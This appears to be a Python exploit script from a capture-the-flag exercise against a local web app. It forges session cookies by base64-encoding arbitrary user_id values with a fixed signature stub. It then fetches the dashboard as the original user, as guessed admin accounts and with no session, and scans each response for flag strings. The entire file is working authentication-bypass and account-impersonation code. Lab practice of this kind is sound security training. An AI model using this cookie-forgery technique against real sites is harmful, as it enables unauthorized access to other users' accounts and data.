#!/usr/bin/env python3
"""
Final Flag Search - Comprehensive Content Extraction
Extracting full content looking for flags in all accessible users
"""

import requests
import base64
import re
import json
from urllib.parse import urljoin

BASE_URL = "http://127.0.0.1:33198"

def create_modified_cookie(user_id):
    """Create modified session cookie"""
    payload = f'{{"user_id":{user_id}}}'
    payload_b64 = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
    return f"{payload_b64}.aVfHAw."

def extract_full_content(user_id, endpoint="/dashboard"):
    """Extract full content for analysis"""
    try:
        url = urljoin(BASE_URL, endpoint)
        session = requests.Session()
        
        if user_id is not None:
            cookie = create_modified_cookie(user_id)
            session.cookies.set('session', cookie, domain='127.0.0.1', path='/')
        
        response = session.get(url, timeout=10)
        
        # Search thoroughly for flags
        flag_patterns = [
            r'FLAG\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'FLA{[^}]+}',
            r'FLAG[^{]*{[^}]*}'
        ]
        
        found_flags = []
        for pattern in flag_patterns:
            matches = re.finditer(pattern, response.text, re.IGNORECASE)
            for match in matches:
                found_flags.append(match.group(0))
        
        return {
            'user_id': user_id,
            'status_code': response.status_code,
            'content_length': len(response.content),
            'flags': found_flags,
            'full_content': response.text,
            'content_preview': response.text[:500]
        }
    except Exception as e:
        return {'error': str(e)}

def main():
    print("=" * 80)
    print("FINAL FLAG EXTRACTION - DEEP CONTENT ANALYSIS")
    print("=" * 80)
    
    # Test the original user_id (10032) thoroughly
    print("\n" + "=" * 60)
    print("[+] TESTING ORIGINAL USER (10032) - John Doe")
    print("=" * 60)
    
    result = extract_full_content(10032)
    if result['status_code'] == 200:
        print(f"[+] User 10032 - Content length: {result['content_length']}B")
        print(f"[+] Preview: {result['content_preview']}")
        
        if result['flags']:
            print(f"\n{'!' * 60}")
            print("[!] FLAG(S) FOUND:")
            for flag in result['flags']:
                print(f"[!] {flag}")
            print(f"{'!' * 60}")
        else:
            print("[+] No flags in user 10032 dashboard")
    
    # Test admin/special users
    special_users = [1, 0, 999, 1337, 9999, 1000]
    
    print("\n" + "=" * 60)
    print("[+] TESTING SPECIAL USERS (potential admin accounts)")
    print("=" * 60)
    
    for user_id in special_users:
        print(f"\n[+] Testing user_id: {user_id}")
        result = extract_full_content(user_id)
        
        if result['status_code'] == 200:
            print(f"[+] Access granted - Length: {result['content_length']}B")
            print(f"[+] Preview: {result['content_preview'][:100]}...")
            
            if result['flags']:
                print(f"\n{'!' * 60}")
                print("[!] FLAG FOUND IN SPECIAL USER!")
                for flag in result['flags']:
                    print(f"[!] FLAG: {flag}")
                print(f"{'!' * 60}")
        else:
            print(f"[-] No access (status: {result.get('status_code')})")
    
    # Test without session (completely unauthorized)
    print("\n" + "=" * 60)
    print("[+] TESTING WITHOUT SESSION COOKIE")
    print("=" * 60)
    
    result = extract_full_content(None)
    if result['status_code'] == 200:
        print(f"[+] Access without session - Length: {result['content_length']}B")
        print(f"[+] Preview: {result['content_preview'][:100]}...")
        
        if result['flags']:
            print(f"\n{'!' * 60}")
            print("[!] FLAG FOUND WITHOUT AUTHENTICATION!")
            for flag in result['flags']:
                print(f"[!] FLAG: {flag}")
            print(f"{'!' * 60}")
    
    print("\n" + "=" * 80)
    print("EXTRACTION COMPLETE")
    print("=" * 80)

if __name__ == "__main__":
    main()

